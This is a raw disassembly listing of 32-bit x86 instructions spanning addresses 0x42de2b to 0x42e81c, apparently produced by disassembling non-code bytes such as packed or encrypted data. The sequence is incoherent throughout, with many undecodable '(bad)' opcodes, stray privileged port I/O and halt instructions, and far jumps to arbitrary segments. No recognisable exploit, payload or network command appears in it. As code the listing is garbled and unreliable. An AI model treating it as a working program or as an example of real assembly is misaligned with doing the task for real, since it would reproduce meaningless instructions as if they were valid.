  42de2b:	cli    
  42de2c:	pop    esi
  42de2d:	or     eax,DWORD PTR [esi+edi*2-0x77]
  42de31:	xchg   edi,eax
  42de32:	xchg   ebx,eax
  42de33:	das    
  42de34:	sbb    bl,BYTE PTR [ebp+0x36]
  42de37:	cmp    eax,0xdd3d6b60
  42de3c:	inc    ecx
  42de3d:	rol    BYTE PTR [eax+0x73],0x27
  42de41:	adc    al,0xc3
  42de43:	aaa    
  42de44:	les    ecx,FWORD PTR [ebp-0x5d]
  42de47:	push   ecx
  42de48:	and    BYTE PTR [eax+0x163964dd],ah
  42de4e:	cwde   
  42de4f:	retf   
  42de50:	(bad)  
  42de51:	enter  0x206,0x4e
  42de55:	xchg   ecx,eax
  42de56:	pop    ecx
  42de57:	mul    BYTE PTR [eax+ebp*2-0x6f36e13f]
  42de5e:	mov    dl,0x81
  42de60:	loope  0x42de2d
  42de62:	ret    0x9198
  42de65:	push   esp
  42de66:	jno    0x42dde9
  42de68:	pusha  
  42de69:	shl    BYTE PTR [edx+0x51],1
  42de6c:	das    
	...
  42ded5:	add    dh,ah
  42ded7:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	and    al,0x58
  42dee4:	push   ss
  42dee5:	xor    eax,0x1eb52
  42deea:	inc    DWORD PTR [eax]
  42deec:	add    BYTE PTR [eax],al
  42deee:	mov    edi,0x9f9ca97a
  42def3:	cmp    dh,dh
  42def5:	stos   DWORD PTR es:[edi],eax
  42def6:	mov    ebp,0x920fe20c
  42defb:	cwde   
  42defc:	repnz outs dx,DWORD PTR ds:[esi]
  42defe:	xchg   BYTE PTR [esi],ch
  42df00:	sub    edx,esi
  42df02:	dec    ebp
  42df03:	pop    ebx
  42df04:	in     eax,dx
  42df05:	cmp    DWORD PTR [edi],esp
  42df07:	scas   eax,DWORD PTR es:[edi]
  42df08:	idiv   BYTE PTR [esi-0x4]
  42df0b:	call   0x2c97:0x61287ffb
  42df12:	pop    es
  42df13:	in     eax,0xa6
  42df15:	and    ebx,0xeeb7f433
  42df1b:	cmp    eax,0x395241e0
  42df20:	xor    esi,edx
  42df22:	inc    ecx
  42df23:	xchg   BYTE PTR [ecx+0x472303d5],bl
  42df29:	push   ds
  42df2a:	bound  eax,QWORD PTR [eax-0x19]
  42df2d:	or     al,0x43
  42df2f:	push   0xd7107605
  42df34:	inc    esp
  42df35:	pop    edx
  42df36:	dec    ecx
  42df37:	ret    
  42df38:	icebp  
  42df39:	mov    dh,0x2f
  42df3b:	rcr    edx,1
  42df3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df3e:	shl    BYTE PTR [edi-0x32],cl
  42df41:	imul   esp,DWORD PTR [ebx-0x37b00605],0x35a89b65
  42df4b:	ror    BYTE PTR [ecx+0x1d],cl
  42df4e:	push   0xffffffc3
  42df50:	xchg   esp,eax
  42df51:	inc    ecx
  42df52:	fmul   QWORD PTR [eax+0x60]
  42df55:	adc    eax,0x6e0cb4ee
  42df5a:	push   ds
  42df5b:	ins    DWORD PTR es:[edi],dx
  42df5c:	and    BYTE PTR [ecx],bl
  42df5e:	mov    ds:0xbf40fd18,al
  42df63:	jg     0x42dfcc
  42df65:	pop    esi
  42df66:	push   ss
  42df67:	push   0x55
  42df69:	imul   esp,ecx,0x1f
  42df6c:	mov    cl,dh
  42df6e:	imul   ebx,DWORD PTR [ebp-0x16],0xffffffec
  42df72:	add    al,0xf1
  42df74:	push   ecx
  42df75:	out    0x72,eax
  42df77:	sbb    DWORD PTR [edi-0x385fc7c0],edi
  42df7d:	mov    eax,DWORD PTR [edi-0x5051f0cb]
  42df83:	hlt    
  42df84:	adc    eax,0x68a39a23
  42df89:	pushf  
  42df8a:	stc    
  42df8b:	shr    DWORD PTR [edi+eiz*2+0x10bbec56],0x65
  42df93:	sar    DWORD PTR ds:0x1d5f2956,cl
  42df99:	into   
  42df9a:	cs call 0xb3f3e68d
  42dfa0:	je     0x42dfa1
  42dfa2:	mov    edi,0x8a0bb670
  42dfa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dfa8:	in     al,0x69
  42dfaa:	mov    BYTE PTR [ebp-0x3978c3c8],al
  42dfb0:	scas   al,BYTE PTR es:[edi]
  42dfb1:	mov    al,ds:0x74f25466
  42dfb6:	pushf  
  42dfb7:	loopne 0x42e024
  42dfb9:	xor    ecx,edi
  42dfbb:	aas    
  42dfbc:	or     ebx,DWORD PTR [ebp-0xe18bd84]
  42dfc2:	add    esp,DWORD PTR [eax-0x55]
  42dfc5:	jge    0x42df7a
  42dfc7:	inc    ebx
  42dfc8:	nop
  42dfc9:	(bad)  
  42dfca:	fisub  WORD PTR [ebp+0x580c62cc]
  42dfd0:	sbb    al,0xa8
  42dfd2:	push   esp
  42dfd3:	sahf   
  42dfd4:	scas   al,BYTE PTR es:[edi]
  42dfd5:	sub    edi,ecx
  42dfd7:	fnstsw WORD PTR [ebp-0x37a62ed1]
  42dfdd:	push   ebx
  42dfde:	push   esi
  42dfdf:	sub    ch,dh
  42dfe1:	xchg   esi,eax
  42dfe2:	mov    al,ds:0xd7f87460
  42dfe7:	xor    edi,ecx
  42dfe9:	inc    edi
  42dfea:	dec    esp
  42dfeb:	cmp    DWORD PTR [esi],esi
	...
  42e055:	add    BYTE PTR [edx],al
  42e057:	(bad)  
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi+0x67]
  42e063:	outs   dx,BYTE PTR ds:[esi]
  42e064:	mov    ecx,DWORD PTR [ecx+edx*2-0xfffe14]
  42e06b:	add    BYTE PTR [eax],al
  42e06d:	add    BYTE PTR [edx+0x50],bh
  42e070:	outs   dx,DWORD PTR ds:[esi]
  42e071:	rol    DWORD PTR [eax+edx*8+0x5cdc968d],cl
  42e078:	cmp    DWORD PTR [esi+0x7b228190],esp
  42e07e:	mov    ds:0x8869c3ea,eax
  42e083:	repz sti 
  42e085:	lahf   
  42e086:	dec    esi
  42e087:	(bad)  
  42e088:	pop    edx
  42e089:	js     0x42e02c
  42e08b:	sub    ah,bl
  42e08d:	test   ch,al
  42e08f:	jmp    0x8010:0x6ae51436
  42e096:	sub    DWORD PTR [esi-0x5a98487c],edi
  42e09c:	fstp   TBYTE PTR [edi+0x6b]
  42e09f:	(bad)  
  42e0a1:	rcl    si,1
  42e0a4:	aam    0xbf
  42e0a6:	and    ch,ch
  42e0a8:	sti    
  42e0a9:	pop    eax
  42e0aa:	lods   al,BYTE PTR ds:[esi]
  42e0ab:	sbb    al,0x9
  42e0ad:	stos   BYTE PTR es:[edi],al
  42e0ae:	popa   
  42e0af:	adc    bh,BYTE PTR [edx+ecx*8+0x3]
  42e0b3:	fdiv   DWORD PTR [eax+edi*8+0x49]
  42e0b7:	in     al,dx
  42e0b8:	push   esi
  42e0b9:	dec    ecx
  42e0ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0bb:	add    DWORD PTR [edx],ebx
  42e0bd:	or     dl,ah
  42e0bf:	push   0x50504f05
  42e0c4:	(bad)  
  42e0c6:	pop    ebp
  42e0c7:	jle    0x42e0f9
  42e0c9:	push   esp
  42e0ca:	add    dh,BYTE PTR [ebx+0x4eda3a34]
  42e0d0:	dec    esp
  42e0d1:	mov    bh,0x6
  42e0d3:	adc    DWORD PTR [esi-0x4],esp
  42e0d6:	fnstsw WORD PTR [ecx-0x10]
  42e0d9:	pop    esi
  42e0da:	lock push cs
  42e0dc:	or     al,0x3a
  42e0de:	mov    eax,ds:0x23a690ba
  42e0e3:	jb     0x42e0a4
  42e0e5:	sub    DWORD PTR [ebx+0x65],0x4e
  42e0e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0ea:	je     0x42e07e
  42e0ec:	mov    edx,0x907fc42a
  42e0f1:	pop    esi
  42e0f2:	scas   eax,DWORD PTR es:[edi]
  42e0f3:	neg    BYTE PTR [ebx+esi*4-0x10]
  42e0f7:	sub    DWORD PTR [eax],edi
  42e0f9:	mov    al,0xd1
  42e0fb:	mov    edi,DWORD PTR [eax]
  42e0fd:	dec    esi
  42e0fe:	xor    BYTE PTR [ebp+ebx*4+0x5d],al
  42e102:	popa   
  42e103:	mov    ebp,0x7a1032a5
  42e108:	sahf   
  42e109:	lds    esp,FWORD PTR [eax+0x79]
  42e10c:	mov    ebp,0x17162240
  42e111:	es inc esp
  42e113:	test   al,0xba
  42e115:	push   eax
  42e116:	in     eax,dx
  42e117:	mov    cl,BYTE PTR [edi-0x5bbd32f5]
  42e11d:	cdq    
  42e11e:	pop    esi
  42e11f:	inc    esi
  42e120:	jmp    0x4837:0xca5b2003
  42e127:	mov    esp,0xce37827d
  42e12c:	inc    ecx
  42e12d:	cmp    eax,0x40225338
  42e132:	ror    BYTE PTR ds:0x4d49edac,cl
  42e138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e139:	xchg   esi,eax
  42e13a:	jl     0x42e0f8
  42e13c:	hlt    
  42e13d:	imul   ebp,ebp,0xffffffb8
  42e140:	popf   
  42e141:	adc    al,0xec
  42e143:	out    dx,al
  42e144:	repnz inc DWORD PTR [edx+0x2233c588]
  42e14b:	sbb    dl,BYTE PTR [esi]
  42e14d:	les    esi,FWORD PTR [edi+ecx*8-0x7983689d]
  42e154:	jmp    0x4cf0:0x22c1d1f3
  42e15b:	dec    ecx
  42e15c:	xchg   ebx,eax
  42e15d:	adc    DWORD PTR [esi+eiz*2-0x6f],ecx
  42e161:	not    ebp
  42e163:	lahf   
  42e164:	mov    bl,0x9d
  42e166:	and    DWORD PTR [ebx+0x7fbb8e43],ebp
  42e16c:	clc    
	...
  42e1d5:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	retf   0xd572
  42e1e5:	stc    
  42e1e6:	push   eax
  42e1e7:	in     eax,dx
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	inc    DWORD PTR [eax]
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	pop    esi
  42e1ef:	sub    cl,BYTE PTR [eax]
  42e1f1:	inc    ebx
  42e1f2:	push   0xffffffb0
  42e1f4:	loope  0x42e1ff
  42e1f6:	stos   DWORD PTR es:[edi],eax
  42e1f7:	jmp    0x127152a0
  42e1fc:	(bad)
  42e1ff:	jb     0x42e265
  42e201:	imul   esi,edi,0xe8a7937e
  42e207:	bound  eax,QWORD PTR [edx-0x4e]
  42e20a:	push   ebp
  42e20b:	shl    DWORD PTR [eax-0x4b1bd085],0xa
  42e212:	sbb    dl,BYTE PTR [eax]
  42e214:	inc    esi
  42e215:	lock cmp DWORD PTR [edx-0x54fc03f9],ecx
  42e21c:	sbb    ebx,DWORD PTR [ebx-0x24]
  42e21f:	dec    edi
  42e220:	hlt    
  42e221:	not    DWORD PTR [ecx+ebx*8]
  42e224:	(bad)  
  42e225:	loop   0x42e1a9
  42e227:	mov    ah,0x18
  42e229:	push   edi
  42e22a:	fcmovb st,st(0)
  42e22c:	xor    esi,ebx
  42e22e:	mov    edx,0xbc8f9dc6
  42e233:	mov    edi,0xc51a6102
  42e238:	jmp    0xbcec:0xa95bfd78
  42e23f:	inc    edx
  42e240:	mov    dh,0x6d
  42e242:	cli    
  42e243:	xor    BYTE PTR [edx-0x6b598907],0x23
  42e24a:	loop   0x42e2a3
  42e24c:	out    0x49,al
  42e24e:	xchg   esp,eax
  42e24f:	sub    al,0x2
  42e251:	xchg   edx,eax
  42e252:	pushf  
  42e253:	aam    0x1c
  42e255:	sbb    DWORD PTR [ebx],0x6f51a5a7
  42e25b:	pop    edi
  42e25c:	lds    esp,FWORD PTR [edx+0x2]
  42e25f:	gs in  al,dx
  42e261:	mov    esp,0x99e65083
  42e266:	inc    ecx
  42e267:	mov    ds:0xdf75c63b,eax
  42e26c:	pusha  
  42e26d:	frstor [ecx+0x362d1ebc]
  42e273:	push   esp
  42e274:	pop    ss
  42e275:	outs   dx,DWORD PTR ds:[esi]
  42e276:	sub    ebp,edx
  42e278:	inc    ebx
  42e279:	or     al,0x53
  42e27b:	lods   eax,DWORD PTR ds:[esi]
  42e27c:	sbb    cl,ch
  42e27e:	dec    ecx
  42e27f:	xlat   BYTE PTR ds:[ebx]
  42e280:	push   cs
  42e281:	dec    edx
  42e282:	(bad)  
  42e284:	lahf   
  42e285:	(bad)  
  42e286:	leave  
  42e287:	mov    ?,WORD PTR [esi-0x706259e9]
  42e28d:	jae    0x42e2e4
  42e28f:	dec    ecx
  42e290:	add    DWORD PTR ds:0xbb4f279d,0xffffffaf
  42e297:	(bad)  
  42e298:	and    al,0x9e
  42e29a:	popf   
  42e29b:	sbb    BYTE PTR [ebp-0x773d5e18],0x6e
  42e2a2:	mov    edi,0x342fc6c1
  42e2a7:	out    0xdb,eax
  42e2a9:	sbb    eax,0xbcadf8ad
  42e2ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e2af:	mov    ebp,fs
  42e2b1:	push   eax
  42e2b2:	dec    esp
  42e2b3:	clc    
  42e2b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e2b5:	mov    ebp,gs
  42e2b7:	in     al,0x2f
  42e2b9:	push   esi
  42e2ba:	inc    esp
  42e2bb:	js     0x42e31d
  42e2bd:	adc    dh,BYTE PTR [eax]
  42e2bf:	mov    DWORD PTR ds:0x7822309e,0xdc3d6e0b
  42e2c9:	stos   DWORD PTR es:[edi],eax
  42e2ca:	mov    ds:0xf698e402,eax
  42e2cf:	sub    esp,DWORD PTR [ebp-0x5f]
  42e2d2:	push   0xffffff97
  42e2d4:	nop
  42e2d5:	mov    ebp,0xa0fa7ea1
  42e2da:	add    al,0xc5
  42e2dc:	xchg   ebx,eax
  42e2dd:	pop    edi
  42e2de:	sub    edi,DWORD PTR [ebp+0x51d241cf]
  42e2e4:	lea    ebp,[esi+0x48ebb195]
  42e2ea:	imul   DWORD PTR [ebx]
  42e2ec:	or     eax,DWORD PTR [eax]
	...
  42e356:	lods   eax,DWORD PTR ds:[esi]
  42e357:	cmp    eax,0xb79aa78a
  42e35c:	lods   eax,DWORD PTR ds:[esi]
  42e35d:	aas    
  42e35e:	mov    ebx,0x36199140
  42e363:	pop    ebp
  42e364:	mov    bh,0x9
  42e366:	dec    edi
  42e367:	out    dx,al
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	inc    DWORD PTR [eax]
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	in     eax,dx
  42e36f:	in     eax,dx
  42e370:	xor    DWORD PTR [esi],0xffffffd4
  42e373:	imul   eax,DWORD PTR [edx-0x5],0x29
  42e377:	in     al,dx
  42e378:	mov    esp,DWORD PTR [edi]
  42e37a:	les    edx,FWORD PTR [eax-0x6877b048]
  42e380:	lahf   
  42e381:	push   esi
  42e383:	xor    ebx,esp
  42e385:	jae    0x42e32d
  42e387:	scas   eax,DWORD PTR es:[edi]
  42e388:	jle    0x42e358
  42e38a:	jne    0x42e36c
  42e38c:	mov    esi,0x321c39c5
  42e391:	mov    ah,0xc1
  42e393:	pop    eax
  42e394:	push   edi
  42e395:	test   edx,0xe0ae6222
  42e39b:	ja     0x42e3d1
  42e39d:	xor    al,0xc5
  42e39f:	(bad)  
  42e3a0:	sbb    DWORD PTR [ecx+esi*1+0xfeb7397],edi
  42e3a7:	mov    eax,0xb3df648f
  42e3ac:	and    bl,0x22
  42e3af:	repz jmp 0x42e3c1
  42e3b2:	inc    edx
  42e3b3:	cmp    edx,ebx
  42e3b5:	fcomp  DWORD PTR ds:0x83433e63
  42e3bb:	call   0xf595:0x9cd756fb
  42e3c2:	jns    0x42e39a
  42e3c4:	push   ss
  42e3c5:	push   ds
  42e3c6:	lea    esi,[edi+0x31]
  42e3c9:	jno    0x42e395
  42e3cb:	sbb    BYTE PTR [ecx+0x73],0xa9
  42e3cf:	das    
  42e3d0:	xchg   BYTE PTR [ecx-0xd],bh
  42e3d3:	sub    al,0xcc
  42e3d5:	dec    edi
  42e3d6:	xor    dl,bh
  42e3d8:	retf   0xc4bd
  42e3db:	or     BYTE PTR [eax],0x8c
  42e3de:	xor    eax,0xb7dcd096
  42e3e3:	xchg   edx,eax
  42e3e4:	cli    
  42e3e5:	jle    0x42e3b8
  42e3e7:	and    DWORD PTR [esi],ecx
  42e3e9:	inc    ebx
  42e3ea:	pop    eax
  42e3eb:	jns    0x42e3af
  42e3ed:	mov    DWORD PTR [eax-0x4f],0xf9e33fe6
  42e3f4:	shr    BYTE PTR [esp+edx*8-0x4f],cl
  42e3f8:	icebp  
  42e3f9:	loope  0x42e471
  42e3fb:	test   BYTE PTR [edi+edi*4-0x370389fe],0x3b
  42e403:	test   esi,edi
  42e405:	mov    DWORD PTR [ecx-0x404fdd9d],edx
  42e40b:	bound  edx,QWORD PTR [edi]
  42e40d:	cli    
  42e40e:	les    esp,FWORD PTR [edx+0x6090a90d]
  42e414:	xchg   bx,ax
  42e416:	push   eax
  42e417:	lods   eax,DWORD PTR ds:[esi]
  42e418:	std    
  42e419:	stos   BYTE PTR es:[edi],al
  42e41a:	ins    DWORD PTR es:[edi],dx
  42e41b:	into   
  42e41c:	sub    DWORD PTR [ecx+0x3397fe0d],0x44
  42e423:	xchg   bh,al
  42e425:	ja     0x42e440
  42e427:	jg     0x42e437
  42e429:	je     0x42e400
  42e42b:	out    dx,al
  42e42c:	mov    ss,WORD PTR [ebx-0x16]
  42e42f:	retf   0x3389
  42e432:	push   ebx
  42e433:	add    eax,0x4d06e568
  42e438:	pusha  
  42e439:	mov    WORD PTR [ebp+0x3a9598ab],?
  42e43f:	cld    
  42e440:	mov    bh,al
  42e442:	push   cs
  42e443:	mov    ah,0x62
  42e445:	out    dx,al
  42e446:	icebp  
  42e447:	mov    dh,0xeb
  42e449:	(bad)  
  42e44a:	pop    esp
  42e44b:	ror    DWORD PTR [ecx-0x2b715ad7],0xe8
  42e452:	enter  0x9895,0xb6
  42e456:	stos   BYTE PTR es:[edi],al
  42e457:	or     bl,bl
  42e459:	add    BYTE PTR [eax],bh
  42e45b:	test   DWORD PTR [eax-0x3e],eax
  42e45e:	sar    bh,0xf2
  42e461:	xor    ch,BYTE PTR [edx+0x5b]
  42e464:	mov    al,cs:0x7f30ce20
  42e46a:	xchg   ebp,eax
  42e46b:	imul   eax,DWORD PTR [ebx+0x0],0x0
	...
  42e4d3:	add    BYTE PTR [eax],al
  42e4d5:	add    dl,ah
  42e4d7:	mov    ebp,0xe7dfc7dc
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	push   es
  42e4e3:	leave  
  42e4e4:	out    0x49,eax
  42e4e6:	dec    esi
  42e4e7:	out    dx,eax
  42e4e8:	add    DWORD PTR [eax],eax
  42e4ea:	inc    DWORD PTR [eax]
  42e4ec:	add    BYTE PTR [eax],al
  42e4ee:	pop    ecx
  42e4ef:	and    ah,BYTE PTR [edi+0x37]
  42e4f2:	mov    dl,0xb
  42e4f4:	mov    edi,0xac6bd400
  42e4f9:	jmp    0x42e528
  42e4fb:	sbb    cl,ah
  42e4fd:	daa    
  42e4fe:	cmp    eax,esp
  42e500:	out    dx,al
  42e501:	(bad)  
  42e502:	inc    ebx
  42e503:	(bad)  
  42e504:	push   cs
  42e505:	mov    BYTE PTR [edi+0x1efbdb26],dh
  42e50b:	mov    BYTE PTR [edx],0xc8
  42e50e:	sub    esi,DWORD PTR ds:0x6514991f
  42e514:	push   0x29
  42e516:	push   esi
  42e517:	jg     0x42e4dd
  42e519:	scas   eax,DWORD PTR es:[edi]
  42e51a:	or     edx,ebp
  42e51c:	(bad)  
  42e51d:	fs (bad) 
  42e51f:	lods   al,BYTE PTR ds:[esi]
  42e520:	mov    ah,0x5d
  42e522:	mov    dl,0xb
  42e524:	lods   eax,DWORD PTR ds:[esi]
  42e525:	repnz xor bl,cl
  42e528:	stos   DWORD PTR es:[edi],eax
  42e529:	(bad)  
  42e52a:	and    DWORD PTR [ebx-0x74c57e8d],ebx
  42e530:	sti    
  42e531:	jmp    0x93cfd23f
  42e536:	pop    edx
  42e537:	inc    edi
  42e538:	test   al,0xf6
  42e53a:	and    BYTE PTR [edx-0x4968d407],cl
  42e540:	imul   edi,DWORD PTR [eax+ebp*4-0x74],0x8c575b86
  42e548:	add    DWORD PTR [edi],ebx
  42e54a:	mov    DWORD PTR ds:0x4cd2d9bb,esi
  42e550:	inc    esp
  42e551:	sub    DWORD PTR [edx+0x67],ecx
  42e554:	in     eax,0x95
  42e556:	out    dx,al
  42e557:	sub    ah,BYTE PTR [ebx+0x300ed7b7]
  42e55d:	jne    0x42e56a
  42e55f:	idiv   DWORD PTR [edx+esi*1+0x175e690a]
  42e566:	ror    DWORD PTR [ebp+0x418b3106],1
  42e56c:	outs   dx,BYTE PTR ds:[esi]
  42e56d:	enter  0x55e4,0x16
  42e571:	and    esp,DWORD PTR [esi+0x26]
  42e574:	dec    esi
  42e575:	lahf   
  42e576:	fstp   st(3)
  42e578:	mov    dl,0xdf
  42e57a:	xor    DWORD PTR [esi+0x71],edx
  42e57d:	mov    ss,WORD PTR [edx]
  42e57f:	dec    edi
  42e580:	das    
  42e581:	in     al,0xd0
  42e583:	add    esi,ebp
  42e585:	xlat   BYTE PTR ds:[ebx]
  42e586:	les    edi,FWORD PTR [eax]
  42e588:	stos   BYTE PTR es:[edi],al
  42e589:	iret   
  42e58a:	cli    
  42e58b:	stos   DWORD PTR es:[edi],eax
  42e58c:	push   eax
  42e58d:	mov    ah,0xdd
  42e58f:	push   esi
  42e590:	add    dh,dh
  42e592:	icebp  
  42e593:	add    ch,BYTE PTR [edi]
  42e595:	jmp    0x42e579
  42e597:	or     al,0xad
  42e599:	outs   dx,BYTE PTR ds:[esi]
  42e59a:	ss aaa 
  42e59c:	sbb    DWORD PTR [ecx-0x18],ebp
  42e59f:	add    bl,BYTE PTR [eax]
  42e5a1:	sbb    al,0xa9
  42e5a3:	imul   eax,DWORD PTR [edx+0x7d],0xffffffa9
  42e5a7:	and    ecx,DWORD PTR [ecx]
  42e5a9:	xor    cl,ah
  42e5ab:	inc    ebx
  42e5ac:	and    DWORD PTR fs:[ebp-0x66],esi
  42e5b0:	out    dx,eax
  42e5b1:	inc    esi
  42e5b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e5b3:	sub    eax,0xb43bb7a5
  42e5b8:	into   
  42e5b9:	xchg   edx,eax
  42e5ba:	scas   al,BYTE PTR es:[edi]
  42e5bb:	mov    al,0xcd
  42e5bd:	add    ebx,esp
  42e5bf:	xor    eax,0xb497ca10
  42e5c4:	nop
  42e5c5:	imul   edi,DWORD PTR [edi],0x6f
  42e5c8:	add    al,0xb7
  42e5ca:	outs   dx,BYTE PTR ds:[esi]
  42e5cb:	mov    bl,0x60
  42e5cd:	gs adc eax,0xb14c94bc
  42e5d3:	jl     0x42e59e
  42e5d5:	int    0x7a
  42e5d7:	mov    cl,0xa7
  42e5d9:	sbb    bh,ah
  42e5db:	cmp    dl,BYTE PTR [edi+esi*4+0x7c]
  42e5df:	xchg   ecx,eax
  42e5e0:	test   DWORD PTR [ebx+ebp*2-0x13],ebx
  42e5e4:	fdivr  DWORD PTR [ecx]
  42e5e6:	jp     0x42e604
  42e5e8:	lods   al,BYTE PTR ds:[esi]
  42e5e9:	mov    dh,0xb6
  42e5eb:	outs   dx,DWORD PTR ds:[esi]
  42e5ec:	leave  
	...
  42e655:	add    BYTE PTR [ebp+0x38],dl
  42e658:	into   
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	in     eax,dx
  42e663:	jp     0x42e69b
  42e665:	das    
  42e666:	dec    ebp
  42e667:	lock add DWORD PTR [eax],eax
  42e66a:	inc    DWORD PTR [eax]
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	xor    dh,dh
  42e670:	pop    ebp
  42e671:	cwde   
  42e672:	cs or  al,0x80
  42e675:	sbb    bl,cl
  42e677:	jbe    0x42e68e
  42e679:	(bad)  
  42e67a:	mov    edx,0x818da119
  42e67f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e680:	add    BYTE PTR [esi],ch
  42e682:	fidiv  DWORD PTR [ebx]
  42e684:	sbb    eax,esp
  42e686:	stos   DWORD PTR es:[edi],eax
  42e687:	pop    ebx
  42e688:	imul   esi,DWORD PTR [edx-0x4dda54e2],0x74
  42e68f:	ja     0x42e6b1
  42e691:	ret    
  42e692:	shl    ebp,1
  42e694:	stc    
  42e695:	cmp    BYTE PTR ds:[ecx-0x2e38d4b9],dh
  42e69c:	sbb    eax,edx
  42e69e:	or     al,0x9c
  42e6a0:	xlat   BYTE PTR ds:[ebx]
  42e6a1:	mov    ds:0xc80c296c,al
  42e6a6:	ret    
  42e6a7:	or     ecx,ebx
  42e6a9:	cmp    bl,ch
  42e6ab:	test   BYTE PTR [ebx+0x4702145e],0xd1
  42e6b2:	mov    dh,ch
  42e6b4:	outs   dx,DWORD PTR ds:[esi]
  42e6b5:	test   ah,dl
  42e6b7:	mov    ds:0xa0ca5b74,al
  42e6bc:	jg     0x42e68e
  42e6be:	rol    DWORD PTR [edx],1
  42e6c0:	loop   0x42e6f2
  42e6c2:	popf   
  42e6c3:	imul   eax,DWORD PTR [edx-0x680e4363],0xffffffdd
  42e6ca:	push   eax
  42e6cb:	inc    ecx
  42e6cc:	loopne 0x42e71b
  42e6ce:	add    ah,ch
  42e6d0:	repnz sti 
  42e6d2:	add    BYTE PTR [edi-0x54b87875],ah
  42e6d8:	sbb    ah,dl
  42e6da:	push   DWORD PTR [eax+0x76]
  42e6dd:	(bad)  
  42e6de:	mov    al,ds:0xa24b99d2
  42e6e3:	mov    dh,0xaf
  42e6e5:	mov    cl,0x88
  42e6e7:	push   ds
  42e6e8:	fcomp  st(3)
  42e6ea:	fld    st(3)
  42e6ec:	inc    ecx
  42e6ed:	shl    bh,0xeb
  42e6f0:	push   0xb409dc68
  42e6f5:	dec    ebx
  42e6f6:	data16 or bl,bl
  42e6f9:	leave  
  42e6fa:	(bad)  
  42e6fc:	and    eax,0xf192f9d1
  42e701:	mov    ebp,0x262d8ce1
  42e706:	addr16 or esi,ebx
  42e709:	aas    
  42e70a:	rcr    DWORD PTR [ebx+0x49],0xcd
  42e70e:	repz fbstp TBYTE PTR [edi+0x3e93ddd9]
  42e715:	inc    ecx
  42e716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e717:	popf   
  42e718:	dec    eax
  42e719:	jae    0x42e778
  42e71b:	into   
  42e71c:	test   al,0xcc
  42e71e:	dec    edx
  42e71f:	xchg   esp,eax
  42e720:	cmp    bl,al
  42e722:	aas    
  42e723:	call   FWORD PTR [esp+eiz*4+0x7f31378e]
  42e72a:	xchg   esi,eax
  42e72b:	inc    ebp
  42e72c:	outs   dx,BYTE PTR ds:[esi]
  42e72d:	pop    edx
  42e72e:	inc    esp
  42e72f:	pusha  
  42e730:	dec    esi
  42e731:	fisttp QWORD PTR [ecx-0x1c]
  42e734:	ret    0xfb47
  42e737:	inc    ecx
  42e738:	enter  0x93bc,0x78
  42e73c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e73d:	je     0x42e6f3
  42e73f:	xlat   BYTE PTR ds:[ebx]
  42e740:	push   fs
  42e742:	adc    BYTE PTR [ecx-0x518738de],al
  42e748:	cli    
  42e749:	xor    eax,0x1125d423
  42e74e:	jo     0x42e76c
  42e750:	aam    0x60
  42e752:	(bad)  
  42e753:	(bad)  
  42e754:	jo     0x42e7a2
  42e756:	jae    0x42e794
  42e758:	xor    DWORD PTR [ebp-0x2c],esp
  42e75b:	lods   eax,DWORD PTR ds:[esi]
  42e75c:	add    eax,DWORD PTR [ecx-0x8]
  42e75f:	int    0xd3
  42e761:	mov    DWORD PTR [edx+0x63],eax
  42e764:	and    eax,0xe8bbbc47
  42e769:	ds and al,0xdd
  42e76c:	imul   eax,DWORD PTR [eax],0x0
	...
  42e7d6:	pop    edx
  42e7d7:	cmp    DWORD PTR [esi+0x2d],ecx
  42e7da:	outs   dx,DWORD PTR ds:[esi]
  42e7db:	jg     0x42e858
  42e7dd:	jg     0x42e843
  42e7df:	sub    BYTE PTR [esi],cl
  42e7e1:	fimul  DWORD PTR [ebx-0x6f]
  42e7e4:	or     ah,al
  42e7e6:	dec    esp
  42e7e7:	icebp  
  42e7e8:	add    DWORD PTR [eax],eax
  42e7ea:	inc    DWORD PTR [eax]
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	mov    DWORD PTR fs:[ebx-0x17faf96a],ecx
  42e7f5:	repnz push es
  42e7f7:	aaa    
  42e7f8:	outs   dx,DWORD PTR ds:[esi]
  42e7f9:	and    edx,ebp
  42e7fb:	or     edx,ecx
  42e7fd:	les    eax,FWORD PTR ds:0x414abe2a
  42e803:	xchg   edi,eax
  42e804:	or     al,0xae
  42e806:	jle    0x42e7d5
  42e808:	sub    eax,DWORD PTR [edi-0x13]
  42e80b:	cdq    
  42e80c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e80d:	and    dl,BYTE PTR [esi+0x35]
  42e810:	daa    
  42e811:	and    BYTE PTR [esi],0xd1
  42e814:	stos   BYTE PTR es:[edi],al
  42e815:	imul   eax,DWORD PTR [edx-0x10],0xa2111a8c
  42e81c:	xor    BYTE PTR [ebx+0x4aa6f08c],bl
